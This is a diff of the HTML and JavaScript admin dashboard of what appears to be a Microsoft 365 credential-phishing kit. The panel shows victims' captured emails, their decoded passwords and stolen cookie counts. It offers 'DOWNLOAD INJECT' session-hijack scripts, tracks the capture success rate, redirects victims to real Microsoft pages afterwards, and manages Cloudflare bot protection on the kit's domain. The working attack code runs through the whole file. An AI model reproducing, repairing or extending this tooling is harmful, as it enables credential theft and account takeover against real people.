-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 5px;
-            border-left: 3px solid var(--info-blue);
         }
     </style>
 </head>
 <body>
-    <!-- Animated background -->
-    <div class="matrix-bg"></div>
-    
-    <!-- Floating particles -->
-    <div class="particles" id="particles"></div>
+    <div class="terminal-bg"></div>
 
     <div class="container">
-        <!-- Enhanced header -->
         <div class="header">
             <div class="ascii-art">
-███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
-████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
-██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
-██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
-██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
-╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-            </div>
-            <h1>COMMAND CENTER</h1>
-        </div>
 
-        <!-- Status bar -->
-        <div class="status-bar">
-            <div class="status-item">
-                <div class="status-dot"></div>
-                <span>NEXUS ONLINE</span>
+                 dP""b8 88     .dP"Y8       db    8888b.  8b    d8 88 88b 88    88""Yb    db    88b 88 888888 88     
+                dP   `" 88     `Ybo."      dPYb    8I  Yb 88b  d88 88 88Yb88    88__dP   dPYb   88Yb88 88__   88     
+                Yb      88  .o o.`Y8b     dP__Yb   8I  dY 88YbdP88 88 88 Y88    88"""   dP__Yb  88 Y88 88""   88  .o 
+                 YboodP 88ood8 8bodP'    dP""""Yb 8888Y"  88 YY 88 88 88  Y8    88     dP""""Yb 88  Y8 888888 88ood8 
+
             </div>
-            <div class="status-item">
-                <span id="currentTime">--:--:--</span>
-            </div>
-            <div class="status-item">
-                <span>SECURITY: MAXIMUM</span>
-            </div>
+            <h1 class="glitch">🚸 </h1>
         </div>
 
         <!-- Authentication Terminal -->
         <div id="auth-section" class="auth-section">
-            <div class="terminal-prompt">ACCESS CONTROL</div>
+            <div class="terminal-prompt">AUTHENTICATION REQUIRED</div>
 
             <div id="auth-form">
                 <input type="password" 
                        id="token-input" 
                        class="token-input" 
-                       placeholder="ENTER AUTHORIZATION TOKEN..." 
+                       placeholder="ENTER PANEL TOKEN..." 
                        onkeypress="if(event.key==='Enter') authenticate()">
                 <button onclick="authenticate()" class="auth-btn">AUTHENTICATE</button>
             </div>
             <div id="auth-success" style="display: none;">
-                ✅ ACCESS GRANTED - WELCOME TO NEXUS
+                ✅ ACCESS GRANTED - WELCOME TO THE MATRIX
                 <button onclick="logout()" class="auth-btn logout-btn">LOGOUT</button>
             </div>
         </div>
 
         <!-- Analytics Command Center -->
         <div id="dashboard-section" class="dashboard-section">
-            <h2 class="dashboard-title">SYSTEM ANALYTICS</h2>
+            <h2 class="dashboard-title">LINK ANALYTICS </h2>
             <div class="dashboard-grid">
                 <div class="dashboard-card">
                     <div class="dashboard-card-icon">📊</div>
@@ -899,64 +628,60 @@
             </div>
         </div>
 
-        <div class="section-divider"></div>
+        <!-- Cloudflare Credentials Configuration -->
+        <div id="cloudflare-config-section" class="dashboard-section" style="border-bottom: 2px solid #ff6666;">
+            <h2 class="dashboard-title" style="color: #ff6666; text-shadow: 0 0 10px #ff6666;">🔧 CLOUDFLARE</h2>
 
-        <!-- Cloudflare Configuration -->
-        <div id="cloudflare-config-section" class="dashboard-section">
-            <h2 class="dashboard-title">🔧 CLOUDFLARE NEXUS</h2>
-
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 25px; margin-bottom: 25px;">
-                <div class="control-panel danger">
-                    <h3 style="color: var(--primary-red); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">🔑 API TOKEN</h3>
-                    <input type="password" id="cf-api-token" class="cf-input" placeholder="Enter Cloudflare API Token..." 
-                           style="border-color: var(--primary-red); color: var(--primary-red);">
-                    <button onclick="toggleTokenVisibility()" id="toggle-token-btn" class="control-btn" 
-                            style="background: linear-gradient(135deg, #666 0%, #333 100%); border-color: #666;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+                <div class="cloudflare-control-panel" style="border-color: #ff6666;">
+                    <h3 style="color: #ff6666; margin-bottom: 15px; text-transform: uppercase;">🔑 API Token</h3>
+                    <input type="password" id="cf-api-token" class="cf-select" placeholder="Enter Cloudflare API Token..." 
+                           style="border-color: #ff6666; color: #ff6666; margin-bottom: 15px;">
+                    <button onclick="toggleTokenVisibility()" id="toggle-token-btn" class="cf-control-btn" 
+                            style="background: linear-gradient(135deg, #666 0%, #333 100%); border-color: #666; margin-bottom: 10px;">
                         SHOW TOKEN
                     </button>
                     <div class="control-description">
-                        Cloudflare Dashboard → My Profile → API Tokens → Create Token
+                        Get from: Cloudflare Dashboard → My Profile → API Tokens → Create Token
                     </div>
                 </div>
 
-                <div class="control-panel danger">
-                    <h3 style="color: var(--primary-red); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">🌐 ZONE ID</h3>
-                    <input type="text" id="cf-zone-id" class="cf-input" placeholder="Enter Cloudflare Zone ID..." 
-                           style="border-color: var(--primary-red); color: var(--primary-red);">
-                    <button onclick="saveCloudflareConfig()" id="save-config-btn" class="control-btn danger">
+                <div class="cloudflare-control-panel" style="border-color: #ff6666;">
+                    <h3 style="color: #ff6666; margin-bottom: 15px; text-transform: uppercase;">🌐 Zone ID</h3>
+                    <input type="text" id="cf-zone-id" class="cf-select" placeholder="Enter Cloudflare Zone ID..." 
+                           style="border-color: #ff6666; color: #ff6666; margin-bottom: 15px;">
+                    <button onclick="saveCloudflareConfig()" id="save-config-btn" class="cf-control-btn cf-emergency">
                         SAVE & SYNC CONFIGURATION
                     </button>
                     <div class="control-description">
-                        Domain Dashboard → Right Sidebar → Zone ID
+                        Found in: Your Domain Dashboard → Right Sidebar → Zone ID
                     </div>
                 </div>
             </div>
 
-            <div id="cf-config-status" style="text-align: center; padding: 20px; margin: 25px 0; border: 2px solid #666; background: rgba(0,0,0,0.7); border-radius: 10px;">
-                <span style="color: var(--primary-red); font-weight: bold;">⚠️ CLOUDFLARE NOT CONFIGURED - ADD CREDENTIALS ABOVE</span>
+            <div id="cf-config-status" style="text-align: center; padding: 15px; margin: 20px 0; border: 2px solid #666; background: rgba(0,0,0,0.5);">
+                <span style="color: #ff6666; font-weight: bold;">⚠️ CLOUDFLARE NOT CONFIGURED - ADD CREDENTIALS ABOVE</span>
             </div>
         </div>
 
-        <div class="section-divider"></div>
+        <!-- Redirect Destination Configuration -->
+        <div id="redirect-config-section" class="dashboard-section" style="border-bottom: 2px solid #00ff88;">
+            <h2 class="dashboard-title" style="color: #00ff88; text-shadow: 0 0 10px #00ff88;">🎯 REDIRECT CONTROL</h2>
 
-        <!-- Redirect Control -->
-        <div id="redirect-config-section" class="dashboard-section">
-            <h2 class="dashboard-title">🎯 REDIRECT CONTROL</h2>
-
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 25px; margin-bottom: 25px;">
-                <div class="control-panel success">
-                    <h3 style="color: var(--success-green); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">📍 CURRENT TARGET</h3>
-                    <div id="current-redirect-display" style="padding: 20px; background: rgba(0,255,136,0.1); border: 2px solid var(--success-green); color: var(--success-green); font-family: 'JetBrains Mono', monospace; font-size: 14px; margin-bottom: 20px; border-radius: 8px;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+                <div class="cloudflare-control-panel" style="border-color: #00ff88;">
+                    <h3 style="color: #00ff88; margin-bottom: 15px; text-transform: uppercase;">📍 Current Target</h3>
+                    <div id="current-redirect-display" style="padding: 15px; background: rgba(0,255,136,0.1); border: 1px solid #00ff88; color: #00ff88; font-family: 'JetBrains Mono', monospace; font-size: 12px; margin-bottom: 15px;">
                         Loading...
                     </div>
-                    <button onclick="loadRedirectConfig()" class="control-btn success">
+                    <button onclick="loadRedirectConfig()" class="cf-control-btn" style="background: linear-gradient(135deg, #00aa88 0%, #006655 100%); border-color: #00ff88;">
                         REFRESH STATUS
                     </button>
                 </div>
 
-                <div class="control-panel success">
-                    <h3 style="color: var(--success-green); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">🎯 SELECT DESTINATION</h3>
-                    <select id="redirect-destination" class="cf-select" style="border-color: var(--success-green); color: var(--success-green);">
+                <div class="cloudflare-control-panel" style="border-color: #00ff88;">
+                    <h3 style="color: #00ff88; margin-bottom: 15px; text-transform: uppercase;">🎯 Select Destination</h3>
+                    <select id="redirect-destination" class="cf-select" style="border-color: #00ff88; color: #00ff88; margin-bottom: 15px;">
                         <option value="https://office.com">Microsoft Office (Default)</option>
                         <option value="https://outlook.office.com/mail/">Outlook Mail</option>
                         <option value="https://www.microsoft.com">Microsoft Home</option>
@@ -969,9 +694,9 @@
                         <option value="https://google.com">Google</option>
                         <option value="custom">Custom URL...</option>
                     </select>
-                    <input type="url" id="custom-redirect-url" class="cf-input" placeholder="Enter custom URL..." 
-                           style="border-color: var(--success-green); color: var(--success-green); display: none;">
-                    <button onclick="updateRedirectDestination()" class="control-btn success">
+                    <input type="url" id="custom-redirect-url" class="cf-select" placeholder="Enter custom URL..." 
+                           style="border-color: #00ff88; color: #00ff88; margin-bottom: 15px; display: none;">
+                    <button onclick="updateRedirectDestination()" class="cf-control-btn" style="background: linear-gradient(135deg, #00ff88 0%, #00aa66 100%); border-color: #00ff88;">
                         UPDATE REDIRECT TARGET
                     </button>
                     <div class="control-description">
@@ -980,22 +705,20 @@
                 </div>
             </div>
 
-            <div id="redirect-status" style="text-align: center; padding: 20px; margin: 25px 0; border: 2px solid var(--success-green); background: rgba(0,255,136,0.1); border-radius: 10px;">
-                <span style="color: var(--success-green); font-weight: bold;">📍 REDIRECT STATUS: READY</span>
+            <div id="redirect-status" style="text-align: center; padding: 15px; margin: 20px 0; border: 2px solid #00ff88; background: rgba(0,255,136,0.1);">
+                <span style="color: #00ff88; font-weight: bold;">📍 REDIRECT STATUS: READY</span>
             </div>
         </div>
 
-        <div class="section-divider"></div>
-
-        <!-- Security Control Center -->
-        <div id="cloudflare-section" class="dashboard-section">
-            <h2 class="dashboard-title">🛡️ SECURITY MATRIX</h2>
+        <!-- Cloudflare Security Control Center -->
+        <div id="cloudflare-section" class="dashboard-section" style="border-bottom: 2px solid #0099ff;">
+            <h2 class="dashboard-title" style="color: #0099ff; text-shadow: 0 0 10px #0099ff;">BOT SECURITY MATRIX</h2>
 
             <div class="dashboard-grid">
                 <div class="dashboard-card info">
                     <div class="dashboard-card-icon">🛡️</div>
                     <div class="dashboard-card-content">
-                        <div class="dashboard-card-number" id="cf-status" style="color: var(--info-blue);">LOADING</div>
+                        <div class="dashboard-card-number" id="cf-status" style="color: #0099ff;">LOADING</div>
                         <div class="dashboard-card-label">System Status</div>
                     </div>
                 </div>
@@ -1022,11 +745,11 @@
                 </div>
             </div>
 
-            <div style="margin-top: 40px; display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 25px;">
+            <div style="margin-top: 30px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                 <!-- Bot Fight Mode Control -->
-                <div class="control-panel">
-                    <h3 style="color: var(--info-blue); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">🤖 BOT PROTECTION</h3>
-                    <button onclick="toggleBotFight()" id="bot-fight-btn" class="control-btn">
+                <div class="cloudflare-control-panel">
+                    <h3 style="color: #ff6666; margin-bottom: 15px; text-transform: uppercase;">🤖 Bot Protection</h3>
+                    <button onclick="toggleBotFight()" id="bot-fight-btn" class="cf-control-btn">
                         TOGGLE BOT FIGHT MODE
                     </button>
                     <div class="control-description">
@@ -1035,8 +758,8 @@
                 </div>
 
                 <!-- Security Level Control -->
-                <div class="control-panel">
-                    <h3 style="color: var(--info-blue); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">🔒 SECURITY LEVEL</h3>
+                <div class="cloudflare-control-panel">
+                    <h3 style="color: #ff6666; margin-bottom: 15px; text-transform: uppercase;">🔒 Security Level</h3>
                     <select id="security-level-select" class="cf-select" onchange="setSecurityLevel()">
                         <option value="off">Off</option>
                         <option value="essentially_off">Essentially Off</option>
@@ -1051,9 +774,9 @@
                 </div>
 
                 <!-- Browser Integrity Check -->
-                <div class="control-panel">
-                    <h3 style="color: var(--info-blue); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">🌐 BROWSER CHECK</h3>
-                    <button onclick="toggleBrowserCheck()" id="browser-check-btn" class="control-btn">
+                <div class="cloudflare-control-panel">
+                    <h3 style="color: #ff6666; margin-bottom: 15px; text-transform: uppercase;">🌐 Browser Check</h3>
+                    <button onclick="toggleBrowserCheck()" id="browser-check-btn" class="cf-control-btn">
                         TOGGLE BROWSER CHECK
                     </button>
                     <div class="control-description">
@@ -1062,12 +785,12 @@
                 </div>
 
                 <!-- Quick Actions -->
-                <div class="control-panel danger">
-                    <h3 style="color: var(--primary-red); margin-bottom: 20px; text-transform: uppercase; font-family: 'Orbitron', monospace;">⚡ QUICK ACTIONS</h3>
-                    <button onclick="enableUnderAttack()" class="control-btn danger">
+                <div class="cloudflare-control-panel">
+                    <h3 style="color: #ff6666; margin-bottom: 15px; text-transform: uppercase;">⚡ Quick Actions</h3>
+                    <button onclick="enableUnderAttack()" class="cf-control-btn cf-emergency">
                         UNDER ATTACK MODE
                     </button>
-                    <button onclick="disableAllProtection()" class="control-btn" style="background: linear-gradient(135deg, #666 0%, #333 100%); border-color: #666;">
+                    <button onclick="disableAllProtection()" class="cf-control-btn cf-disable">
                         DISABLE ALL PROTECTION
                     </button>
                     <div class="control-description">
@@ -1077,19 +800,16 @@
             </div>
         </div>
 
-        <div class="section-divider"></div>
-
         <!-- Sessions Database -->
         <div class="sessions-header">
             <h2>ENCRYPTED SESSION DATABASE</h2>
         </div>
 
         <div id="loading" class="loading">
-            <div class="loading-spinner"></div>
-            <span style="margin-left: 20px;">LOADING CLASSIFIED DATA...</span>
+            LOADING CLASSIFIED DATA...
         </div>
 
-        <div id="error" class="message error" style="display: none;">
+        <div id="error" class="error" style="display: none;">
             SYSTEM ERROR - DATA COMPROMISED
         </div>
 
@@ -1109,42 +829,12 @@
             </table>
         </div>
 
-        <div id="no-sessions" class="message info" style="display: none;">
+        <div id="no-sessions" class="no-sessions" style="display: none;">
             NO CLASSIFIED SESSIONS FOUND
         </div>
     </div>
 
     <script>
-        // Initialize particles
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            const particleCount = 20;
-
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + 'vw';
-                particle.style.animationDelay = Math.random() * 15 + 's';
-                particle.style.animationDuration = (15 + Math.random() * 10) + 's';
-                particlesContainer.appendChild(particle);
-            }
-        }
-
-        // Update current time
-        function updateTime() {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString('en-US', { hour12: false });
-            document.getElementById('currentTime').textContent = timeString;
-        }
-
-        // Initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            createParticles();
-            updateTime();
-            setInterval(updateTime, 1000);
-            checkAuthOnLoad();
-        });
-
         // Authentication state
         let isAuthenticated = false;
         let adminToken = null;
@@ -1155,6 +845,7 @@
             if (storedToken) {
                 adminToken = storedToken;
                 updateAuthUI(true);
+                // Load analytics immediately
                 setTimeout(() => {
                     loadAnalytics();
                     loadSessions();
@@ -1170,6 +861,7 @@
             const authSection = document.getElementById('auth-section');
             const authForm = document.getElementById('auth-form');
             const authSuccess = document.getElementById('auth-success');
+            const authStatus = document.getElementById('auth-status');
             const loading = document.getElementById('loading');
             const sessionsContent = document.getElementById('sessions-content');
             const noSessions = document.getElementById('no-sessions');
@@ -1178,25 +870,17 @@
                 authSection.classList.add('authenticated');
                 authForm.style.display = 'none';
                 authSuccess.style.display = 'block';
-                loading.classList.add('show');
+                loading.style.display = 'block';
                 sessionsContent.style.display = 'none';
                 noSessions.style.display = 'none';
-                
-                setTimeout(() => {
-                    loadCloudflareStatus();
-                    loadRedirectConfig();
-                }, 500);
             } else {
                 authSection.classList.remove('authenticated');
                 authForm.style.display = 'block';
                 authSuccess.style.display = 'none';
-                loading.classList.remove('show');
+                loading.style.display = 'none';
                 sessionsContent.style.display = 'none';
                 noSessions.style.display = 'none';
                 document.getElementById('error').style.display = 'none';
-                
-                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
-                document.getElementById('cf-status').style.color = 'var(--primary-red)';
             }
         }
 
@@ -1211,6 +895,7 @@
             }
 
             try {
+                // Test the token by making a request to the sessions endpoint
                 const response = await fetch('/api/admin/sessions?token=' + encodeURIComponent(token));
 
                 if (response.ok) {
@@ -1218,7 +903,7 @@
                     localStorage.setItem('adminToken', token);
                     updateAuthUI(true);
                     loadSessions();
-                    loadAnalytics();
+                    loadAnalytics(); // Ensure analytics load after authentication
                     tokenInput.value = '';
                 } else if (response.status === 401) {
                     alert('ACCESS DENIED: INVALID TOKEN DETECTED');
@@ -1249,10 +934,12 @@
             const button = document.getElementById(`reveal-btn-${index}`);
 
             if (passwordDiv.classList.contains('password-masked')) {
+                // Reveal password
                 passwordDiv.className = 'password-revealed';
                 passwordDiv.textContent = password;
                 button.textContent = 'HIDE';
             } else {
+                // Hide password
                 passwordDiv.className = 'password-masked';
                 const passwordMask = '█'.repeat(Math.min(password.length, 12));
                 passwordDiv.textContent = passwordMask;
@@ -1270,6 +957,7 @@
                 const response = await fetch(`/api/admin/sessions?token=${encodeURIComponent(token)}`);
 
                 if (response.status === 401) {
+                    // Token expired or invalid
                     logout();
                     alert('SESSION EXPIRED: RE-AUTHENTICATION REQUIRED');
                     return;
@@ -1277,7 +965,7 @@
 
                 const sessions = await response.json();
 
-                document.getElementById('loading').classList.remove('show');
+                document.getElementById('loading').style.display = 'none';
 
                 if (!sessions.sessions || sessions.sessions.length === 0) {
                     document.getElementById('no-sessions').style.display = 'block';
@@ -1290,6 +978,7 @@
                 sessions.sessions.forEach((session, index) => {
                     const row = document.createElement('tr');
 
+                    // Style the row based on status
                     if (session.status === 'invalid') {
                         row.style.backgroundColor = 'rgba(255, 51, 51, 0.1)';
                         row.style.borderLeft = '4px solid #ff3333';
@@ -1298,8 +987,10 @@
                         row.style.borderLeft = '4px solid #00ff00';
                     }
 
+                    // Handle password column based on status
                     let passwordColumn = '';
                     if (session.status === 'valid' && session.password) {
+                        // Decode base64 password for valid sessions
                         let decodedPassword = session.password;
                         try {
                             decodedPassword = atob(session.password);
@@ -1310,49 +1001,53 @@
 
                         passwordColumn = `
                             <div class="password-container">
-                                <div id="password-${index}" class="password-masked" style="background: rgba(0, 0, 0, 0.8); padding: 8px; border: 1px solid var(--primary-red); border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--accent-red);">
+                                <div id="password-${index}" class="password-masked">
                                     ${passwordMask}
                                 </div>
                                 <button onclick="togglePassword(${index}, '${decodedPassword.replace(/'/g, "\\'")}')"
-                                    id="reveal-btn-${index}" class="control-btn" style="margin-top: 8px; padding: 4px 8px; font-size: 10px;">SHOW</button>
+                                    id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                             </div>
                         `;
                     } else if (session.status === 'invalid') {
+                        // Show reason for invalid entries
                         const reason = session.reason || 'FAILED ENTRY';
                         passwordColumn = `<span style="color: #ff6666; font-weight: bold;">❌ ${reason.toUpperCase()}</span>`;
                     } else {
+                        // Fallback for other cases
                         passwordColumn = `<span style="color: #666;">N/A - NO PASSWORD</span>`;
                     }
 
+                    // Handle inject script column
                     let injectColumn = '';
                     if (session.status === 'valid' && session.injectFilename) {
                         injectColumn = `<a href="/api/admin/download-inject/${session.injectFilename}?token=${encodeURIComponent(getStoredToken())}" 
-                                           class="control-btn success" download style="text-decoration: none; display: inline-block; padding: 6px 12px; font-size: 10px;">
+                                           class="download-btn" download>
                                             DOWNLOAD INJECT
                                         </a>`;
                     } else {
                         injectColumn = `<span style="color: #666;">NO INJECT SCRIPT</span>`;
                     }
 
+                    // Status badge
                     const statusBadge = session.status === 'valid' 
                         ? `<span style="color: #00ff66; font-weight: bold;">✅ VALID</span>`
                         : `<span style="color: #ff3333; font-weight: bold;">❌ INVALID</span>`;
 
                     row.innerHTML = `
                         <td>${statusBadge}</td>
-                        <td style="color: var(--accent-red); font-weight: 500;">${session.email}</td>
+                        <td class="email-cell">${session.email}</td>
                         <td>${passwordColumn}</td>
                         <td>${injectColumn}</td>
                         <td>
-                            <div style="font-size: 11px;">ID: ${session.id}</div>
-                            <div style="font-size: 10px; color: #999; margin-top: 4px;">
+                            <div>ID: ${session.id}</div>
+                            <div class="session-info">
                                 TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}
                             </div>
                             ${session.status === 'valid' ? 
-                                `<div style="font-size: 10px; color: #999; margin-top: 2px;">COOKIES: ${session.totalCookies} ENCRYPTED</div>` :
-                                `<div style="font-size: 10px; color: #ff6666; margin-top: 2px;">FAILURE REASON: ${session.reason || 'Unknown Error'}</div>
-                                 ${session.errorMessage ? `<div style="font-size: 10px; color: #ff9999; margin-top: 2px;">ERROR DETAILS: ${session.errorMessage}</div>` : ''}
-                                 <div style="font-size: 10px; color: #ffcc99; margin-top: 2px;">STATUS: FAILED AUTHENTICATION</div>`
+                                `<div class="session-info">COOKIES: ${session.totalCookies} ENCRYPTED</div>` :
+                                `<div class="session-info" style="color: #ff6666;">FAILURE REASON: ${session.reason || 'Unknown Error'}</div>
+                                 ${session.errorMessage ? `<div class="session-info" style="color: #ff9999;">ERROR DETAILS: ${session.errorMessage}</div>` : ''}
+                                 <div class="session-info" style="color: #ffcc99;">STATUS: FAILED AUTHENTICATION</div>`
                             }
                         </td>
                     `;
@@ -1364,7 +1059,7 @@
 
             } catch (error) {
                 console.error('Error loading sessions:', error);
-                document.getElementById('loading').classList.remove('show');
+                document.getElementById('loading').style.display = 'none';
                 const errorDiv = document.getElementById('error');
                 errorDiv.textContent = `SYSTEM ERROR: ${error.message}`;
                 errorDiv.style.display = 'block';
@@ -1374,6 +1069,7 @@
         // Load analytics data
         async function loadAnalytics() {
             if (!isAuthenticated) {
+                // Set loading state for analytics
                 document.getElementById('total-visits').textContent = '-';
                 document.getElementById('valid-entries').textContent = '-';
                 document.getElementById('invalid-entries').textContent = '-';
@@ -1383,9 +1079,12 @@
 
             try {
                 const token = getStoredToken();
+                console.log('Loading analytics with token...');
+
                 const response = await fetch(`/api/admin/analytics?token=${encodeURIComponent(token)}`);
 
                 if (response.status === 401) {
+                    console.error('Analytics: Unauthorized access');
                     logout();
                     return;
                 }
@@ -1395,17 +1094,23 @@
                 }
 
                 const analytics = await response.json();
+                console.log('Analytics data received:', analytics);
 
+                // Update dashboard cards with animation
                 updateAnalyticsCard('total-visits', analytics.totalVisits || 0);
                 updateAnalyticsCard('valid-entries', analytics.validEntries || 0);
                 updateAnalyticsCard('invalid-entries', analytics.invalidEntries || 0);
 
+                // Calculate success rate
                 const total = (analytics.validEntries || 0) + (analytics.invalidEntries || 0);
                 const successRate = total > 0 ? Math.round((analytics.validEntries / total) * 100) : 0;
                 updateAnalyticsCard('success-rate', successRate + '%');
 
+                console.log('Analytics updated successfully');
+
             } catch (error) {
                 console.error('Error loading analytics:', error);
+                // Set error state
                 document.getElementById('total-visits').textContent = 'ERROR';
                 document.getElementById('valid-entries').textContent = 'ERROR';
                 document.getElementById('invalid-entries').textContent = 'ERROR';
@@ -1413,6 +1118,7 @@
             }
         }
 
+        // Helper function to update analytics cards with animation
         function updateAnalyticsCard(elementId, value) {
             const element = document.getElementById(elementId);
             if (element) {
@@ -1471,25 +1177,43 @@
 
                 if (data.success) {
                     document.getElementById('cf-config-status').innerHTML = 
-                        '<span style="color: var(--success-green); font-weight: bold;">✅ CLOUDFLARE CONFIGURED & SYNCED SUCCESSFULLY</span>';
+                        '<span style="color: #00ff66; font-weight: bold;">✅ CLOUDFLARE CONFIGURED & SYNCED SUCCESSFULLY</span>';
 
+                    // Clear the input fields for security
                     document.getElementById('cf-api-token').value = '';
                     document.getElementById('cf-zone-id').value = '';
 
+                    // Load Cloudflare status immediately
                     setTimeout(() => loadCloudflareStatus(), 1000);
 
-                    alert('✅ CLOUDFLARE CONFIGURATION SAVED SUCCESSFULLY!');
+                    alert('✅ CLOUDFLARE CONFIGURATION SAVED SUCCESSFULLY!\n\nCredentials have been securely stored and the system is now connected to your Cloudflare account.');
                 } else {
                     throw new Error(data.error || 'Configuration failed');
                 }
             } catch (error) {
                 console.error('Error saving Cloudflare config:', error);
                 document.getElementById('cf-config-status').innerHTML = 
-                    `<span style="color: var(--primary-red); font-weight: bold;">❌ CONFIGURATION FAILED: ${error.message}</span>`;
+                    `<span style="color: #ff3333; font-weight: bold;">❌ CONFIGURATION FAILED: ${error.message}</span>`;
                 alert('❌ CONFIGURATION FAILED: ' + error.message);
             } finally {
                 saveBtn.disabled = false;
                 saveBtn.textContent = 'SAVE & SYNC CONFIGURATION';
+            }
+        }
+
+        function loadConfigurationStatus() {
+            // Check if Cloudflare is already configured by trying to load status
+            if (isAuthenticated) {
+                loadCloudflareStatus().then(() => {
+                    // If status loads successfully, update config status
+                    const cfStatus = document.getElementById('cf-status').textContent;
+                    if (cfStatus === 'ONLINE') {
+                        document.getElementById('cf-config-status').innerHTML = 
+                            '<span style="color: #00ff66; font-weight: bold;">✅ CLOUDFLARE CONFIGURED & CONNECTED</span>';
+                    }
+                }).catch(() => {
+                    // Keep the default "not configured" message
+                });
             }
         }
 
@@ -1513,38 +1237,43 @@
 
                 if (data.success) {
                     document.getElementById('cf-status').textContent = 'ONLINE';
-                    document.getElementById('cf-status').style.color = 'var(--success-green)';
+                    document.getElementById('cf-status').style.color = '#00ff66';
+
+                    // Update status displays
                     updateCloudflareStatus(data.settings);
                 } else {
                     document.getElementById('cf-status').textContent = 'ERROR';
-                    document.getElementById('cf-status').style.color = 'var(--primary-red)';
+                    document.getElementById('cf-status').style.color = '#ff3333';
                 }
             } catch (error) {
                 console.error('Error loading Cloudflare status:', error);
                 document.getElementById('cf-status').textContent = 'OFFLINE';
-                document.getElementById('cf-status').style.color = 'var(--primary-red)';
+                document.getElementById('cf-status').style.color = '#ff3333';
             }
         }
 
         function updateCloudflareStatus(settings) {
+            // Update Bot Fight Mode
             document.getElementById('bot-fight-status').textContent = settings.botFightMode ? 'ON' : 'OFF';
-            document.getElementById('bot-fight-status').style.color = settings.botFightMode ? 'var(--success-green)' : 'var(--primary-red)';
+            document.getElementById('bot-fight-status').style.color = settings.botFightMode ? '#00ff66' : '#ff6666';
 
+            // Update Security Level
             document.getElementById('security-level-status').textContent = settings.securityLevel.toUpperCase();
             document.getElementById('security-level-select').value = settings.securityLevel;
 
             const securityColors = {
                 'off': '#666',
                 'essentially_off': '#999',
-                'low': 'var(--warning-yellow)',
+                'low': '#ffff66',
                 'medium': '#ff9933',
-                'high': 'var(--primary-red)',
+                'high': '#ff6666',
                 'under_attack': '#ff0000'
             };
-            document.getElementById('security-level-status').style.color = securityColors[settings.securityLevel] || 'var(--primary-red)';
+            document.getElementById('security-level-status').style.color = securityColors[settings.securityLevel] || '#ff6666';
 
+            // Update Browser Check
             document.getElementById('browser-check-status').textContent = settings.browserCheck ? 'ON' : 'OFF';
-            document.getElementById('browser-check-status').style.color = settings.browserCheck ? 'var(--success-green)' : 'var(--primary-red)';
+            document.getElementById('browser-check-status').style.color = settings.browserCheck ? '#00ff66' : '#ff6666';
         }
 
         async function toggleBotFight() {
@@ -1568,7 +1297,8 @@
 
                 if (data.success) {
                     document.getElementById('bot-fight-status').textContent = data.botFightMode ? 'ON' : 'OFF';
-                    document.getElementById('bot-fight-status').style.color = data.botFightMode ? 'var(--success-green)' : 'var(--primary-red)';
+                    document.getElementById('bot-fight-status').style.color = data.botFightMode ? '#00ff66' : '#ff6666';
+                    console.log(data.message);
                 } else {
                     alert('Error: ' + data.error);
                 }
@@ -1601,12 +1331,13 @@
                     const securityColors = {
                         'off': '#666',
                         'essentially_off': '#999',
-                        'low': 'var(--warning-yellow)',
+                        'low': '#ffff66',
                         'medium': '#ff9933',
-                        'high': 'var(--primary-red)',
+                        'high': '#ff6666',
                         'under_attack': '#ff0000'
                     };
-                    document.getElementById('security-level-status').style.color = securityColors[data.securityLevel] || 'var(--primary-red)';
+                    document.getElementById('security-level-status').style.color = securityColors[data.securityLevel] || '#ff6666';
+                    console.log(data.message);
                 } else {
                     alert('Error: ' + data.error);
                 }
@@ -1637,7 +1368,8 @@
 
                 if (data.success) {
                     document.getElementById('browser-check-status').textContent = data.browserCheck ? 'ON' : 'OFF';
-                    document.getElementById('browser-check-status').style.color = data.browserCheck ? 'var(--success-green)' : 'var(--primary-red)';
+                    document.getElementById('browser-check-status').style.color = data.browserCheck ? '#00ff66' : '#ff6666';
+                    console.log(data.message);
                 } else {
                     alert('Error: ' + data.error);
                 }
@@ -1684,24 +1416,28 @@
             const token = getStoredToken();
 
             try {
+                // Disable bot fight mode
                 await fetch(`/api/admin/cloudflare/bot-fight?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ enabled: false })
                 });
 
+                // Set security to off
                 await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ level: 'off' })
                 });
 
+                // Disable browser check
                 await fetch(`/api/admin/cloudflare/browser-check?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ enabled: false })
                 });
 
+                // Refresh status
